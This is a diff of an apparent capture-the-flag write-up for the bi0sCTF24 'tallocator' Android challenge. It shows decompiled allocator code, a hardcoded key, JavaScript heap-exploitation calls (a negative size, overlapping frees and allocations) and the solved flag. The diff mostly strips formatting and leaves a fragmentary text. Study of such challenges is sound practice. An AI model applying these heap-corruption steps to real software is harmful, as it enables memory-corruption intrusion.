@@ -8,11 +8,6 @@
 chinmay@potato:~/Documents/CTF/bi0sCTF24/tallocator$ ls
 
 app.apk Dockerfile flag native.c readme.md script.py
-```
-
-
-
-```
 app/lib/
 
 ├── arm64-v8a
@@ -38,17 +33,7 @@ app/lib/
  ├── libnative.so
 
  └── libtallocator.so
-```
-
-
-
-```
 const key = "50133tbd5mrt1769";
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_talloc
 
  v6 = a1;
@@ -98,11 +83,6 @@ const key = "50133tbd5mrt1769";
  perror("Debugger called !!");
 
  }
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_talloc
 
  size = (data_size + 0x17) & 0xFFFFFFFFFFFFFFF0LL;
@@ -204,11 +184,6 @@ LABEL_40:
  }
 
  }
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_talloc
 
  v30 = (_QWORD *)wilderness_s;
@@ -254,11 +229,6 @@ LABEL_44:
  *(found - 1) = v32 | 1;
 
  return found;
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_tree
 
  v3 = *(a3 - 1);
@@ -288,11 +258,6 @@ LABEL_44:
  {
 
  v6 = *(_QWORD *)(sbrk_ed + 0x18);
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_tree
 
  if ( (int)size > 0x100 )
@@ -344,11 +309,6 @@ LABEL_9:
  a3[1] = v7;
 
  goto LABEL_9;
-```
-
-
-
-```
 //Java_bi0sctf_android_challenge_MainActivity_tree
 
  wilderness_s -= (int)size;
@@ -358,11 +318,6 @@ LABEL_9:
  *v5 = 0LL;
 
  return 0LL;
-```
-
-
-
-```
 var arr = new Uint8Array(0x28);
 
 for (var i = 0; i < 0x28; i++) {
@@ -384,78 +339,28 @@ arr[0x23] = 0x41;
 var ret = bi0sctf.secure_talloc(key, 0x28, arr);
 
 bi0sctf.secure_talloc(key, 0x10, arr);
-```
-
-
-
-```
 bi0sctf.secure_tree(key, ret + 0x20);
 
 bi0sctf.secure_tree(key, ret);
-```
-
-
-
-```
 arr[0x18] = 0;
 
 bi0sctf.secure_talloc(key, 0x28, arr);
-```
-
-
-
-```
 bi0sctf.secure_talloc(key, -23, arr);
-```
-
-
-
-```
 arr[0x20] = 8;
 
 bi0sctf.secure_tree(key, ret);
 
 bi0sctf.secure_talloc(key, 0x28, arr);
-```
-
-
-
-```
 bi0sctf.secure_talloc(key, 0xf0, smarr);
 
 bi0sctf.secure_talloc(key, 0xf0, sharr);
-```
-
-
-
-```
 bi0sctf.secure_tree(key, ret - 0x18);
-```
-
-
-
-```
 bi0sctf.secure_talloc(key, 0x160, smarr);
-```
-
-
-
-```
 bi0sctf.secure_talloc(key, 0x10, smarr);
-```
-
-
-
-```
 bi0sctf{y0u_h4v3_t4ll0c3d_y0ur_w4y_thr0ugh_1281624072}
-```
-
-
-
-```
 <html>
 
-<Body>
+
 
 <script>
 
@@ -551,7 +456,7 @@ bi0sctf.secure_talloc(key, 0x10, smarr);
 
 </script>
 
-</Body>
+
 
 </html>
 ```
